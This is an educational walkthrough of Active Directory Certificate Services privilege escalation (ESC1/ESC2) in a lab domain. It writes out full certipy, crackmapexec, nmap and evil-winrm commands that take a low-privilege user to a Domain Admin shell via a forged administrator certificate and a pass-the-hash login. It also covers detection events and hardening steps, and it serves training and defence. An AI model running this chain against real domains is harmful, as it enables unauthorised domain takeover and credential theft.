
# 🏴 Active Directory Certificate Services (AD CS) Escalation – ESC Series
*A detailed, educational reference for authorised security testing and blue‑team awareness.*

---

## 1  Introduction
Active Directory Certificate Services (AD CS) provides PKI within Windows domains.  
When certificate templates or enrollment rights are mis‑configured, ordinary users can obtain certificates that impersonate privileged accounts.  
SpecterOps’ **Certified Pre‑Owned** paper grouped these issues into *ESC1 – ESC8*.

This walkthrough shows how to:
* Discover Enterprise CAs in a domain  
* Identify vulnerable templates  
* Abuse an **ESC1/ESC2** configuration to obtain Domain Admin access  
* Detect and harden against it  

Everything below is performed in a **lab** domain using mock data.

---

## 2  Lab Setup / Tools

| Component | Example value |
|------------|---------------|
| Domain | `lab.local` |
| Domain Controller / CA | `DC01.lab.local (10.10.10.10)` |
| Attacker host | Kali Linux 2025 |
| Low‑priv user | `student@lab.local : Passw0rd!` |
| Tools | `certipy‑ad`, `Certify.exe`, `impacket`, `evil‑winrm`, `bloodhound‑python` |

---

## 3  Enumerating Certificate Authorities

### 3.1  Quick enumeration with Certipy
```bash
certipy find -u student@lab.local -p 'Passw0rd!' -dc-ip 10.10.10.10 -vulnerable
```

Output highlights any CAs and vulnerable templates (§ ESC flags).

### 3.2  Hunting for other CAs in the network
Secondary or test CAs may exist on file or management servers.

**SMB / RPC sweep**
```bash
crackmapexec smb 10.10.10.0/24 -u student -p 'Passw0rd!' -M adcs
```

**Nmap enumeration**
```bash
nmap -p 135,139,445,5985,9389 10.10.10.0/24 --script adcs-enum
```

**PowerShell on any Windows host**
```powershell
certutil -ping
Get-ChildItem -Path 'Cert:\LocalMachine\CA' -Recurse
```

---

## 4  Abusing an ESC1 / ESC2 Template

### 4.1  Request a certificate as another user
```bash
certipy req -u student@lab.local -p 'Passw0rd!' \
            -ca DC01-CA -template User \
            -upn administrator@lab.local \
            -target dc01.lab.local
```
Creates `administrator.pfx`.

### 4.2  Authenticate using the certificate
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```
Expected:
```
[*] Got TGT for 'administrator@lab.local'
[*] NT hash ..........
```

### 4.3  Use the hash for a WinRM session
```bash
evil-winrm -i dc01.lab.local -u administrator -H <ntlm_hash>
```
`PS C:\Users\Administrator>` → you now have Domain Admin privileges in the lab.

---

## 5  Other ESC Vectors (overview)

| ESC | Description | Key Mitigation |
|-----|--------------|----------------|
| 1 | Enrollee supplies subject name (SAN abuse) | remove that flag |
| 2 | Misused template with manager approval bypass | restrict enrollment |
| 3–5 | Certificates that can sign other certs | isolate CAs |
| 6 | NTLM relay to HTTP enrollment | enforce EPA / disable HTTP enrollment |
| 8 | Web Enrollment + PetitPotam | patch & disable NTLM relay targets  |

---

## 6  Finding and Fixing Template Issues as Admin

**Check for “Enrollee Supplies Subject”**
```powershell
Get-CertificateTemplate | 
  Where-Object {($_.msPKI-Certificate-Name-Flag -match 'ENROLLEE_SUPPLIES_SUBJECT')}
```

**Audit CA templates and permissions**
```
certutil -v -template
```

**Restrict enrollment rights**
Only allow specific security groups (not Domain Users).

---

## 7  Detection Tips

| Indicator | Log Source |
|------------|------------|
| Unauthorized certificate request | Event 4886, 4887 |
| Certificate issued for unexpected UPN | Event 4888 |
| New login via Smartcard/CERT with no prior enrollment | 4624 (Logon Type = 3, AuthPackage = Kerberos) |
| `certipy auth` or `Certify.exe` strings on traffic | IDS / Defender ATP |

---

## 8  Example Full Chain (Overview Diagram)

```
[User: student] 
   │  Enrollment rights on template “User”
   ▼
[CA: DC01-CA] issues cert for administrator@lab.local
   │
   ▼
[Certipy auth] → obtains Administrator TGT/NT hash
   │
   ▼
[Evil‑WinRM] → Domain Admin shell
```

---

## 9  Hardening Checklist

- Disable “Enrollee Supplies Subject” where not required  
- Remove “Authenticated Users” from `Enroll` and `AutoEnroll` on templates  
- Require manager approval or CA Officer signature  
- Disable HTTP Web Enrollment and CEP/CES if unused  
- Patch & monitor for NTLM/relay abuse (PetitPotam)  

---

## 10  References & Further Reading
- [SpecterOps – Certified Pre‑Owned (PDF)](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)  
- [Certipy‑AD by ly4k](https://github.com/ly4k/Certipy)  
- [GhostPack Certify](https://github.com/GhostPack/Certify)  
- [Microsoft AD CS Hardening Guide](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/plan/security-best-practices)

---

### ⚠️ Disclaimer
This material is for **educational / authorised testing only**.  
Do not use these techniques on any system without written permission.

---
```

---


##
##

```markdown
### 3.3  Example: discovering more than one CA in a domain

```
             +---------------------------+
             |  DC01.lab.local           |
             |  Enterprise Root CA       |
             |  SMB 445 / RPC 135 / 9389 |
             +-------------+-------------+
                           |
                           |  certificate published to AD
                           v
             +---------------------------+
             |  FILE01.lab.local         |
             |  "Test-CA" (Standalone)   |
             |  often missed by defenders|
             +-------------+-------------+
                           |
                           |  service account: svc_pki
                           v
             +---------------------------+
             |  CLIENT01.lab.local       |
             |  user: student            |
             |  certipy / certify tools  |
             +---------------------------+

   [  student  ]  --►  enumerates domain  --
                      find dc01‑CA + file01‑CA
                      choose vulnerable template
                      request cert ► escalate
```

##
##
